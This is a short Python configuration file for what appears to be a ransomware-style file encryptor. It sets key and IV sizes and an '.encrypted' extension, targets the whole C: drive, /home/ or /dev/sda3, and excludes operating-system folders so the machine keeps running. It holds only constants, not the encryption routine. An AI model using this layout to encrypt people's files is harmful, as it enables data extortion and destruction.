from sys import platform

KEY_FILE: str = 'file.key'
PAD_SIZE: int = 128
KEY_SIZE: int = 32
IV_SIZE: int = 16
EXT: str = '.encrypted'
UNTOUCHED_FILES: list[str] = 'python', '.py', '.key'
UNTOUCHED_FOLDERS: list[str] = 'encryptor', 'vs', 'py312', '.vscode'
UNTOUCHED_COMMON: list[str] = 'visualstudio',
UNTOUCHED: list[str] = []
UNTOUCHED.extend(UNTOUCHED_FILES)
UNTOUCHED.extend(UNTOUCHED_FOLDERS)
UNTOUCHED.extend(UNTOUCHED_COMMON)
if platform == 'win32':
    TARGET_DISK: str = 'C:\\'
    USER_DIR: str = f'{TARGET_DISK}Users'
    UNTOUCHED.append('windows')
    UNTOUCHED.append('program')
else:
    TARGET_DISK: str = '/dev/sda3'
    extr: list[str] = ['bash', 'bin', 'sys', 'srv']
    UNTOUCHED.extend(extr)
    USER_DIR: str = '/home/'
